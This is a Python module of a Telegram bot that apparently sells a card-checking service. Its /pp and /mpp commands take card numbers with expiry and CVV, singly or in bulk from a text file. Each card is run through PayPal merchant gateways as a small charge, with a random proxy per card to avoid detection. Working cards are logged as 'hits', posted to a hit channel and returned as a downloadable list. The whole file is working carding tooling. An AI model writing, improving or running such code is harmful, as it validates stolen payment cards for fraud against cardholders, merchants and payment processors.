"""
pp_chk.py — PayPal Gateway Checker
/pp   — Single card check
/mpp  — Mass check (reply to .txt file)
/setpp — Set custom price (0.01 – 10.00)
"""
import asyncio
import time
import random

from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
)
from aiogram.exceptions import TelegramBadRequest

from config import FREE_USERS_BLOCKED, HIT_CHAT_ID, HIT_SEND_DELAY
from helpers import get_html, escape, is_admin, can_use, btn, make_keyboard
from data import (
    register_user, is_user_banned,
    get_user_proxies, get_all_global_proxies,
    get_bin_lookup_cache, save_bin_lookup,
    save_check_result,
    get_pp_gateways, get_pp_gateway_price,
    set_pp_gateway_price,
    increment_global_hit,
)
from shopify import parse_cards, luhn_valid
from paypal import pp_check, get_bin

router = Router()

_S1             = "★━━━━━━━━━━━━━━★"
_S2             = "✧━━━━━━━━━━━━━━✧"
_LIGHT          = get_html("lightning1")
_BOT_USERNAME   = "PAID_3BOT"
_BOT_LINE       = f'[{get_html("lightning1")}] <b>𝐁𝐨𝐭:</b> <a href="https://t.me/PAID_3BOT">P3 Shopi</a>'

PP_PRICE_MIN = 0.01
PP_PRICE_MAX = 10.00
PP_PRICE_DEF = 1.00

_APPROVED_RESPONSES = {
    "CHARGE", "INSUFFICIENT_FUNDS", "CVV2_FAILURE",
    "CVV2_MISMATCH", "CVV_FAILURE",
}

_pp_active: dict[int, asyncio.Event] = {}

def _is_approved(resp: str) -> bool:
    r = resp.upper()
    if r.startswith("CHARGE"): return True
    return any(kw in r for kw in _APPROVED_RESPONSES)

def _status_icon(resp: str) -> str:
    if resp.upper().startswith("CHARGE"): return get_html("charge")
    if _is_approved(resp):                return get_html("approved")
    return get_html("declined")

def _status_label(resp: str) -> str:
    if resp.upper().startswith("CHARGE"): return "Charge"
    if _is_approved(resp):                return "Approved"
    return "Declined"

def _bar(current: int, total: int, length: int = 15) -> str:
    filled = int((current / total * length)) if total else 0
    return "▰" * filled + "▱" * (length - filled)

async def _safe_edit(msg, text: str, markup=None):
    try:
        await msg.edit_text(text, parse_mode="HTML", reply_markup=markup)
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e):
            pass
    except Exception:
        pass

def _stop_kb(uid: int) -> InlineKeyboardMarkup:
    return make_keyboard([[btn("S T O P", f"pp_stop:{uid}", style="danger")]])

async def _get_bin(bin_code: str) -> dict:
    cached = await get_bin_lookup_cache(bin_code)
    if cached: return cached
    try:
        loop = asyncio.get_event_loop()
        bank, country, flag, brand, btype = await loop.run_in_executor(None, get_bin, bin_code)
        data = {"bank": bank, "country_name": country, "country_flag": flag,
                "brand": brand, "type": btype}
        await save_bin_lookup(bin_code, data)
        return data
    except Exception:
        return {"bank": "?", "country_name": "?", "country_flag": "🌍", "brand": "?", "type": "?"}

async def _pick_pp_gateway(uid: int) -> tuple[dict | None, float]:
    gws = await get_pp_gateways()
    if not gws: return None, PP_PRICE_DEF
    gw    = random.choice(gws)
    price = await get_pp_gateway_price(uid)
    return gw, price

async def _pick_proxy(uid: int):
    """يختار بروكسي عشوائي من قائمة المستخدم أو البروكسيات العامة."""
    try:
        user_px = await get_user_proxies(uid)
        if user_px:
            return random.choice(user_px)
    except Exception:
        pass
    try:
        global_px = await get_all_global_proxies()
        if global_px:
            return random.choice(global_px)
    except Exception:
        pass
    return None

async def _run_pp(cc: str, site: str, price: float, proxy=None) -> tuple:
    t0   = time.monotonic()
    loop = asyncio.get_event_loop()
    resp = await loop.run_in_executor(None, pp_check, cc, f"{price:.2f}", site, proxy)
    return resp or "UNKNOWN_ERROR", time.monotonic() - t0

async def _send_pp_hit(bot, uid: int, user, card: str, resp: str,
                       price: float, elapsed: float, gw: dict):
    hit_num   = await increment_global_hit()
    first     = escape(user.first_name or "User")
    spoiler   = f"<tg-spoiler>{card}</tg-spoiler>"
    bin_code  = card.split("|")[0][:6]
    icon      = _status_icon(resp)
    label     = _status_label(resp)
    bin_info  = await _get_bin(bin_code)
    bank      = bin_info.get("bank", "?")
    country   = bin_info.get("country_name", "?")
    flag      = bin_info.get("country_flag", "🌍")
    brand     = bin_info.get("brand", "?")
    btype     = bin_info.get("type", "?")
    gw_id     = gw.get("id", "?")
    gate_disp = f"PayPal_V{gw_id}"

    bot_btn = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Copy CC", copy_text=CopyTextButton(text=card)),
    ]])

    user_text = (
        f"<b>PayPal</b> [{_LIGHT}]\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐂𝐂:</b> {spoiler}\n"
        f"[{_LIGHT}] <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <b>{label}</b> {icon}\n"
        f"[{_LIGHT}] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{resp}</b>\n"
        f"[{_LIGHT}] <b>𝐆𝐚𝐭𝐞:</b> <b>{gate_disp} — ${price:.2f}</b>\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐁𝐢𝐧:</b> <b>{bin_code} - {brand} - {btype}</b>\n"
        f"[{_LIGHT}] <b>𝐁𝐚𝐧𝐤:</b> <b>{bank}</b>\n"
        f"[{_LIGHT}] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{country} {flag}</b>\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f}s</b> {get_html('time')}\n"
        f"[{_LIGHT}] <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> <b>{first}</b> {get_html('user')}\n"
        f"{_S1}\n"
        + _BOT_LINE
    )
    try:
        await bot.send_message(uid, user_text, parse_mode="HTML", reply_markup=bot_btn)
    except Exception:
        pass

    if HIT_CHAT_ID:
        hit_text = (
            f"[{_LIGHT}] <b>𝗛𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱</b> {get_html('fire')}  #{hit_num}\n"
            f"{_S1}\n"
            f"[{_LIGHT}] <b>𝐔𝐬𝐞𝐫:</b> <b>{first}</b>\n"
            f"[{_LIGHT}] <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <b>{label}</b> {icon}\n"
            f"[{_LIGHT}] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{resp}</b>\n"
            f"[{_LIGHT}] <b>𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f}s</b> {get_html('time')}\n"
            f"[{_LIGHT}] <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> <b>{gate_disp} — ${price:.2f}</b>\n"
            f"{_S1}\n"
            + _BOT_LINE
        )
        try:
            await bot.send_message(HIT_CHAT_ID, hit_text, parse_mode="HTML",
)
            if HIT_SEND_DELAY:
                await asyncio.sleep(HIT_SEND_DELAY)
        except Exception:
            pass


# ── /pp — Single ──────────────────────────────────────────────────────────────
@router.message(Command("pp"))
async def cmd_pp(message: Message):
    uid  = message.from_user.id
    user = message.from_user
    await register_user(uid, user.username or "", user.first_name or "")

    if await is_user_banned(uid):
        await message.answer(f"{get_html('denied')} You are banned.", parse_mode="HTML"); return
    if FREE_USERS_BLOCKED and not await can_use(uid):
        await message.answer(f"{get_html('denied')} No active subscription.", parse_mode="HTML"); return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer(
            f"{get_html('warning')} <b>Usage:</b> <code>/pp CC|MM|YY|CVV</code>", parse_mode="HTML"); return

    cards = parse_cards(parts[1], 1)
    if not cards:
        await message.answer(f"{get_html('error')} Invalid card format.", parse_mode="HTML"); return

    card = cards[0]
    if not luhn_valid(card.split("|")[0]):
        await message.answer(f"{get_html('error')} Card failed Luhn check.", parse_mode="HTML"); return

    gw, price = await _pick_pp_gateway(uid)
    if not gw:
        await message.answer(f"{get_html('error')} No PayPal gateways available.", parse_mode="HTML"); return

    site      = gw["site"]
    gw_id     = gw.get("id", "?")
    gate_disp = f"PayPal_V{gw_id}"
    proxy     = await _pick_proxy(uid)
    wait_msg  = await message.answer(f"{get_html('time')} <b>Checking...</b>", parse_mode="HTML")

    resp, elapsed = await _run_pp(card, site, price, proxy)
    is_hit = _is_approved(resp)
    label  = _status_label(resp)
    icon   = _status_icon(resp)

    bin_code = card.split("|")[0][:6]
    bin_info = await _get_bin(bin_code)
    bank     = bin_info.get("bank", "?")
    country  = bin_info.get("country_name", "?")
    flag     = bin_info.get("country_flag", "🌍")
    brand    = bin_info.get("brand", "?")
    btype    = bin_info.get("type", "?")
    first    = escape(user.first_name or "User")

    text = (
        f"<b>PayPal</b> [{_LIGHT}]\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐂𝐂:</b> <tg-spoiler>{card}</tg-spoiler>\n"
        f"[{_LIGHT}] <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <b>{label}</b> {icon}\n"
        f"[{_LIGHT}] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{resp}</b>\n"
        f"[{_LIGHT}] <b>𝐆𝐚𝐭𝐞:</b> <b>{gate_disp} — ${price:.2f}</b>\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐁𝐢𝐧:</b> <b>{bin_code} - {brand} - {btype}</b>\n"
        f"[{_LIGHT}] <b>𝐁𝐚𝐧𝐤:</b> <b>{bank}</b>\n"
        f"[{_LIGHT}] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{country} {flag}</b>\n"
        f"{_S1}\n"
        f"[{_LIGHT}] <b>𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f}s</b> {get_html('time')}\n"
        f"[{_LIGHT}] <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> <b>{first}</b> {get_html('user')}\n"
        f"{_S1}\n"
        + _BOT_LINE
    )
    copy_kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Copy CC", copy_text=CopyTextButton(text=card)),
    ]]) if is_hit else None

    await _safe_edit(wait_msg, text, copy_kb)

    if is_hit:
        await _send_pp_hit(message.bot, uid, user, card, resp, price, elapsed, gw)
    await save_check_result(uid, card, label, resp, price, elapsed, "PayPal", "")


# ── /mpp — Mass check ─────────────────────────────────────────────────────────
@router.message(Command("mpp"))
async def cmd_mpp(message: Message):
    uid  = message.from_user.id
    user = message.from_user
    await register_user(uid, user.username or "", user.first_name or "")

    if await is_user_banned(uid):
        await message.answer(f"{get_html('denied')} You are banned.", parse_mode="HTML"); return
    if FREE_USERS_BLOCKED and not await can_use(uid):
        await message.answer(f"{get_html('denied')} No active subscription.", parse_mode="HTML"); return
    if uid in _pp_active:
        await message.answer(f"{get_html('warning')} Already running a PayPal check.", parse_mode="HTML"); return
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.answer(
            f"{get_html('warning')} Reply to a <b>.txt</b> file containing cards.", parse_mode="HTML"); return

    gw, price = await _pick_pp_gateway(uid)
    if not gw:
        await message.answer(f"{get_html('error')} No PayPal gateways available.", parse_mode="HTML"); return

    file    = await message.bot.get_file(message.reply_to_message.document.file_id)
    content = await message.bot.download_file(file.file_path)
    cards   = parse_cards(content.read().decode("utf-8", errors="ignore"), 5000)
    if not cards:
        await message.answer(f"{get_html('error')} No valid cards found.", parse_mode="HTML"); return

    site      = gw["site"]
    gw_id     = gw.get("id", "?")
    gate_disp = f"PayPal_V{gw_id}"
    total     = len(cards)
    stop_ev   = asyncio.Event()
    _pp_active[uid] = stop_ev
    start     = time.time()

    charge = approved = declined = error = 0
    last_card = last_resp = last_label = last_proxy_host = ""
    _hits_log: list = []
    _last_edit  = [0.0]
    _next_iv    = [random.uniform(3.0, 5.0)]

    # ── جمع البروكسيات مسبقاً للتناوب عليها ──────────────────────
    _proxy_pool: list = []
    try:
        _proxy_pool = list(await get_user_proxies(uid) or [])
    except Exception:
        pass
    if not _proxy_pool:
        try:
            _proxy_pool = list(await get_all_global_proxies() or [])
        except Exception:
            pass

    def _rand_proxy():
        return random.choice(_proxy_pool) if _proxy_pool else None

    def _fmt_proxy(p):
        if not p: return "No proxy"
        p = p.replace("http://", "").replace("https://", "")
        return p.split("@")[-1] if "@" in p else (":".join(p.split(":")[:2]) if ":" in p else p)

    init_text = (
        f"{get_html('time')} 0.0s  |  0 c/s\n"
        f"[{_bar(0, total)}]  0%  0/{total}\n"
        f"{_S2}\n"
        f"<blockquote>"
        f"{get_html('card')} Card: —\n"
        f"{get_html('warning')} Checking..."
        f"</blockquote>\n"
        f"{_S2}\n"
        f"<blockquote>"
        f"{get_html('fire')} Charge: 0  •  {get_html('approved')} Approved: 0\n"
        f"{get_html('declined')} Declined: 0  •  {get_html('warning')} Error: 0"
        f"</blockquote>\n"
        f"{_S2}\n"
        f"<blockquote>"
        f"{get_html('gate')} Gate: <b>{gate_disp} — ${price:.2f}</b>\n"
        f"{get_html('proxy')} Proxy: <code>{'pool: ' + str(len(_proxy_pool)) if _proxy_pool else 'none'}</code>"
        f"</blockquote>"
    )
    prog = await message.answer(init_text, parse_mode="HTML", reply_markup=_stop_kb(uid))

    async def _update():
        now = time.time()
        if now - _last_edit[0] < _next_iv[0]:
            return
        _last_edit[0] = now
        _next_iv[0]   = random.uniform(3.0, 5.0)
        elapsed   = now - start
        elapsed_s = f"{int(elapsed//60)}m {int(elapsed%60)}s" if elapsed >= 60 else f"{elapsed:.1f}s"
        pct       = int(processed / total * 100) if total else 0
        bar       = _bar(processed, total)
        icon      = _status_icon(last_resp) if last_resp else get_html("warning")
        masked    = f"<tg-spoiler>{last_card}</tg-spoiler>" if last_card else "—"
        text = (
            f"{get_html('time')} {elapsed_s}\n"
            f"[{bar}]  {pct}%  {processed}/{total}\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('card')} Card: {masked}\n"
            f"{icon} {last_label} — {last_resp}"
            f"</blockquote>\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('fire')} Charge: {charge}  •  {get_html('approved')} Approved: {approved}\n"
            f"{get_html('declined')} Declined: {declined}  •  {get_html('warning')} Error: {error}"
            f"</blockquote>\n"
            f"{_S2}\n"
            f"<blockquote>"
            f"{get_html('gate')} Gate: <b>{gate_disp} — ${price:.2f}</b>\n"
            f"{get_html('proxy')} Proxy: <code>{last_proxy_host or 'none'}</code>"
            f"</blockquote>"
        )
        await _safe_edit(prog, text, _stop_kb(uid))

    processed = 0
    for card in cards:
        if stop_ev.is_set():
            break
        if not luhn_valid(card.split("|")[0]):
            error += 1
            processed += 1
            await _update()
            continue

        # ── اختار بروكسي عشوائي جديد لكل بطاقة ──────────────────
        cur_proxy = _rand_proxy()
        last_proxy_host = _fmt_proxy(cur_proxy)

        try:
            resp, elapsed_c = await _run_pp(card, site, price, cur_proxy)
            is_hit  = _is_approved(resp)
            label   = _status_label(resp)
            last_card  = card
            last_resp  = resp
            last_label = label
            if resp.upper().startswith("CHARGE"):  charge   += 1
            elif is_hit:                            approved += 1
            else:                                   declined += 1
            if is_hit:
                _hits_log.append((card, resp, label, elapsed_c))
                await _send_pp_hit(message.bot, uid, user, card, resp, price, elapsed_c, gw)
            await save_check_result(uid, card, label, resp, price, elapsed_c, "PayPal", "")
        except Exception:
            error += 1

        processed += 1
        await asyncio.sleep(3.0)
        await _update()

    _pp_active.pop(uid, None)
    elapsed_t = time.time() - start
    elapsed_s = f"{int(elapsed_t//60)}m {int(elapsed_t%60)}s" if elapsed_t >= 60 else f"{elapsed_t:.1f}s"
    cs_final  = f"{processed / elapsed_t:.1f}" if elapsed_t > 0 else "0"
    stopped   = stop_ev.is_set()
    bar       = _bar(processed, total)
    pct       = int(processed / total * 100) if total else 0

    final = (
        f"{get_html('stop') if stopped else get_html('approved')} "
        f"<b>{'Stopped' if stopped else 'Done'}</b>\n"
        f"[{bar}]  {pct}%  {processed}/{total}\n"
        f"{_S2}\n"
        f"<blockquote>"
        f"{get_html('fire')} Charge: <b>{charge}</b>  •  {get_html('approved')} Approved: <b>{approved}</b>\n"
        f"{get_html('declined')} Declined: <b>{declined}</b>  •  {get_html('warning')} Error: <b>{error}</b>"
        f"</blockquote>\n"
        f"{_S2}\n"
        f"<blockquote>"
        f"{get_html('time')} Time: <b>{elapsed_s}</b>  |  <b>{cs_final} c/s</b>\n"
        f"{get_html('gate')} Gate: <b>{gate_disp} — ${price:.2f}</b>"
        f"</blockquote>"
    )
    await _safe_edit(prog, final)

    if _hits_log:
        try:
            from aiogram.types import BufferedInputFile
            lines = [
                "=" * 50,
                "  P3 SHOPI — PayPal Hits",
                f"  Gate : {gate_disp}  |  Price: ${price:.2f}",
                f"  Hits : {len(_hits_log)}  |  Total: {processed}",
                "=" * 50, "",
            ]
            for idx, (c, r, l, el) in enumerate(_hits_log, 1):
                lines += [
                    f"[{idx}] {l.upper()}",
                    f"  Card     : {c}",
                    f"  Response : {r}",
                    f"  Price    : ${price:.2f}",
                    f"  Time     : {el:.2f}s",
                    "",
                ]
            lines += ["=" * 50, f"  Bot: @{_BOT_USERNAME}", "=" * 50]
            fbytes = "\n".join(lines).encode()
            fobj   = BufferedInputFile(fbytes, filename=f"pp_hits_{uid}.txt")
            cap    = (
                f"{get_html('fire')} <b>PayPal Hits</b>\n"
                f"{_S1}\n"
                f"{get_html('charge')} Charge: <b>{charge}</b>  •  {get_html('approved')} Approved: <b>{approved}</b>\n"
                f"{get_html('gate')} Gate: <b>{gate_disp}</b>  •  <b>${price:.2f}</b>"
            )
            await message.answer_document(fobj, caption=cap, parse_mode="HTML")
        except Exception:
            pass


# ── Stop callback ─────────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("pp_stop:"))
async def pp_stop_cb(callback):
    uid = int(callback.data.split(":")[1])
    if callback.from_user.id != uid and not is_admin(callback.from_user.id):
        await callback.answer("Not yours.", show_alert=True); return
    ev = _pp_active.get(uid)
    if ev: ev.set()
    await callback.answer("Stopping...", show_alert=False)


# ── /setpp — Set price ────────────────────────────────────────────────────────
@router.message(Command("setpp"))
async def cmd_setpp(message: Message):
    uid  = message.from_user.id
    user = message.from_user
    await register_user(uid, user.username or "", user.first_name or "")

    if await is_user_banned(uid):
        await message.answer(f"{get_html('denied')} You are banned.", parse_mode="HTML"); return
    if FREE_USERS_BLOCKED and not await can_use(uid):
        await message.answer(f"{get_html('denied')} No active subscription.", parse_mode="HTML"); return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        current = await get_pp_gateway_price(uid)
        await message.answer(
            f"[{_LIGHT}] <b>PayPal Price</b>\n{_S1}\n"
            f"Current: <b>${current:.2f}</b>\n\n"
            f"Usage: <code>/setpp [price]</code>\n"
            f"Range: <b>${PP_PRICE_MIN:.2f} – ${PP_PRICE_MAX:.2f}</b>",
            parse_mode="HTML"); return

    try:
        new_price = float(parts[1].strip().replace("$", ""))
    except ValueError:
        await message.answer(f"{get_html('error')} Invalid price.", parse_mode="HTML"); return

    if not (PP_PRICE_MIN <= new_price <= PP_PRICE_MAX):
        await message.answer(
            f"{get_html('warning')} Price must be between <b>${PP_PRICE_MIN:.2f}</b> and <b>${PP_PRICE_MAX:.2f}</b>",
            parse_mode="HTML"); return

    await set_pp_gateway_price(uid, new_price)
    await message.answer(
        f"{get_html('approved')} <b>PayPal price set to ${new_price:.2f}</b>",
        parse_mode="HTML")
